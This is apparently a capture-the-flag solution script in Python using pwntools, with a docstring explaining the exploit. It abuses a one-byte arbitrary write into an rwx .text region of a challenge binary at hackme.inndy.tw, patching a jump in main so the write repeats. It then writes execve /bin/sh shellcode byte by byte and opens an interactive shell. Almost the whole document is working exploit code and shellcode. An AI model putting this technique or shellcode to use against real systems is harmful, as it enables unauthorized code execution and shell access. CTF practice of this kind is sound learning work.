'''
1. This program allow you to modify a byte at anywhere

2. 0x400000 - 0x401000 is rwx

According to the above,
we can modify instruction in main.

Firstly, this exploit modifies
0x400767 <main+117>: jne    400773 <main+0x81>
to
0x400767 <main+117>: jne    40072c <main+0x3a>
By doing this, we can modify a byte at anywhere again and again.

In gdb, you can 
set *(char *)0x400768 = 0xc3
to do it.

Then, keep modifing main function to shellcode, and run it~~

This program use "mprotect" to make .text writable.

0
program Text (.text)
Initialised Data (.data)
Uninitialised Data (.bss)
Heap
 |
 V
Memory Mapped Region for shared libraries or anything else
 ^
 |
Stack

Reference:
http://faydoc.tripod.com/cpu/jle.htm
https://gist.github.com/CMCDragonkai/10ab53654b2aa6ce55c11cfc5b2432a4
http://man7.org/linux/man-pages/man2/mprotect.2.html

'''
from pwn import *

r = remote("hackme.inndy.tw", 7718)

shellcode = '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05\xff'
address = 0x400769

receive = r.recvuntil('?')
print receive

addrstr = hex(0x400768)
bytestr = str(-61)
payload = addrstr + ' ' + bytestr
print payload
r.sendline(payload)


for i in range(len(shellcode)):
    addrstr = hex(address)
    bytestr = str(ord(shellcode[i]))
    payload = addrstr + ' ' + bytestr
    print payload
    r.sendline(payload)

    address += 1

r.interactive()
